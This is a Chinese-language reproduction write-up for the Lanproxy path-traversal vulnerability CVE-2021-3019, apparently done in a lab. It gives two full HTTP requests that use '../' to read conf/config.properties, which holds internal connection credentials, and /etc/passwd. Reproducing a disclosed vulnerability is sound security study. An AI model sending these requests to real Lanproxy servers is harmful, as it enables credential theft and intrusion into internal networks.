# CVE-2021-3019 Lanproxy任意文件读取漏洞

## 漏洞描述

Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）

本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据。

## 影响版本

lanproxy 0.1

## 漏洞复现

访问靶机IP:8090，转到登录页

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210628193026.png)

打开Burpsuite，开启抓包，刷新首页抓一个包。发送到repeater，修改请求url如下(X.X.X.X代指服务器)：

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210628193459.png)

```
GET /../conf/config.properties HTTP/1.1
Host: X.X.X.X:8090
Cache-Control: max-age=0IP
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
```

![](https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210628193627.png)

```
GET /../../../../../etc/passwd HTTP/1.1
Host: X.X.X.X:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
```

## 解决方案

升级到最新版本